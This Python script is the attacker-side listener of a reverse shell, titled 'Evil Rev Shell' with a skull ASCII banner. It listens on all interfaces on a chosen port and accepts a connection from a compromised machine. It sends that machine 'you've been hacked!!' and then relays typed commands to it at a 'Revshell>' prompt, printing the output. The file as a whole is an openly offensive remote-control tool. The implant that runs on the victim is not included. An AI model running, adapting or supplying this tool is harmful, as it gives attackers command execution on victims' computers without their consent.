import socket
import os


os.system("clear")
print('\033[31m'+"                                     ........                            "+'\033[0m') 
print('\033[31m'+"                               'lkKNMMMMMMMMMMNKkl'                      "+'\033[0m')              
print('\033[31m'+"                            'kWMMMMMMMMMMMMMMMMMMMMWk'                   "+'\033[0m')            
print('\033[31m'+"                          .OMMMMMMMMMMMMMMMMMMMMMMMMMMO.                 "+'\033[0m')                 
print('\033[31m'+"                          XMMMMMMMMMMMMMMMMMMMMMMMMMMMMX.                "+'\033[0m')               
print('\033[31m'+"                         :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMc                "+'\033[0m')           
print('\033[31m'+"                         :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMc                "+'\033[0m')           
print('\033[31m'+"                         .WMMMX:.. .;NMMMMMMMd.  .,OMMMN.                "+'\033[0m')         
print('\033[31m'+"                          cWMMX      ,MMMMMMx      xMMW,                 "+'\033[0m')           
print('\033[31m'+"                           .XMM0.    .WMMMMMc     lMMX.                  "+'\033[0m')              
print('\033[31m'+"                            'MMMWOxx0WMNlcNMMXkxkNMMM,                   "+'\033[0m')            
print('\033[31m'+"                             XMMMMMMMMk ;: dMMMMMMMMX.                   "+'\033[0m')              
print('\033[31m'+"                              'cx0NMMMNkWWkXMMMN0xc'                     "+'\033[0m')         
print('\033[31m'+"                     ...        ;o'.0MXMXNMXWK.,d.         ..            "+'\033[0m')      
print('\033[31m'+"                    oMMMXo.     .XMd..,o;:o,..xMK       :kWMMl           "+'\033[0m')       
print('\033[31m'+"                    cMMMMMMK:     ,oKMMMMMMMM0o,     ,kWMMMMMl           "+'\033[0m')      
print('\033[31m'+"                   :NMMMMMMMMMN0xc'. cO0OOOOl  .;okXMMMMMMMMMWc          "+'\033[0m')      
print('\033[31m'+"                   kXNKd,.,:lxKWMMMMNOo;..'lkKWMMMWKxl:'.;dKWWK          "+'\033[0m')   
print('\033[31m'+"                                .,cxXMMMMMMMMXkl,.                       "+'\033[0m')            
print('\033[31m'+"                                 'lONMMMNWMMMNOl'                        "+'\033[0m')          
print('\033[31m'+"                             ,d0WMMMXx:.  .ckNMMMW0o,                    "+'\033[0m')        
print('\033[31m'+"                    .':loxk0WMMMWOc.          .l0MMMMW0xdlc,.            "+'\033[0m')          
print('\033[31m'+"                   KMMMMMMMMMWk:                 .:kWMMMMMMMMWk          "+'\033[0m')          
print('\033[31m'+"                   lOKKWMMMMM:                      :WMMMMMNXOl          "+'\033[0m')        
print('\033[31m'+"                        cKWXl                        '0NKd.              "+'\033[0m')    
print('\033[31m'+"                                                                         "+'\033[0m')
print('\033[31m'+"            ______      _ __  \033[1m\033[35m ____            \033[31m   _____ __         ____  "+'\033[0m') 
print('\033[31m'+"           / ____/   __(_) /  \033[1m\033[35m/ __ \___ _   __ \033[31m  / ___// /_  ___  / / /  "+'\033[0m')   
print('\033[31m'+"          / __/ | | / / / /  \033[1m\033[35m/ /_/ / _ \ | / / \033[31m  \__ \/ __ \/ _ \/ / /   "+'\033[0m')  
print('\033[31m'+"         / /___ | |/ / / /  \033[1m\033[35m/ _, _/  __/ |/ /  \033[31m ___/ / / / /  __/ / /    "+'\033[0m')  
print('\033[31m'+"        /_____/ |___/_/_/  \033[1m\033[35m/_/ |_|\___/|___/   \033[31m/____/_/ /_/\___/_/_/     "+'\033[0m')  
print()
print()



SERVER_HOST = "0.0.0.0"
SERVER_PORT = int(input("Listen Port? : "))
BUFFER_SIZE = 100000

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

message = "you've been hacked!!".encode()
client_socket.send(message)

while True:
    command = input("\033[33mRevshell> \033[0m")
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)

client_socket.close()
s.close()
